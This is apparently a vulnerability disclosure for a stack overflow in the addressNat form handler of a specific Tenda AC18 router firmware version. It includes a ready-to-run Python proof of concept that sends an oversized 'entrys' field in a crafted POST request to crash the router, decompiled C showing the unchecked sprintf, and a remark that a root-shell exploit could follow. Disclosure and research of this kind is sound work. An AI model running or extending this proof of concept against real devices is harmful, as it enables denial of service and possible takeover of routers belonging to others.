# fromAddressNat

### Affected product

```
AC18 V15.03.05.19
```

/goform/addressNat，entrys 、mitInterface and page  are controllable and will eventually be spliced into s  or v6 by sprintf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability

### POC

```
import socket
import os

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.0.119'
port = 80

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

r.connect((ip, port))

rn = b'\r\n'

p1 = b'a' * 0x1000
p2 = b'mitInterface=1&page=1&entrys' + p1

p3 = b"POST /goform/fromAddressNat" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.119" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A; password=1111" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)
```

### Detail

```c
 v9 = (const char *)sub_2BA8C(a1, "entrys", &unk_E5D48);
  v8 = (const char *)sub_2BA8C(a1, "mitInterface", &unk_E5D48);
  sprintf(s, "%s;%s", v9, v8);
  sub_4EC58("adv.addrnat", s, 126);
  v7 = (const char *)sub_2BA8C(a1, "page", "1");
  v1 = sprintf(v6, "advance/addressNatList.asp?page=%s", v7);
  if ( CommitCfm(v1) )
  {
    sprintf(v4, "advance_type=%d", 7);
    send_msg_to_netctrl(5, v4);
  }
  return sub_2BE4C(a1, v6);
}
```

You can see the router crash, and finally we can write an exp to get a root shell
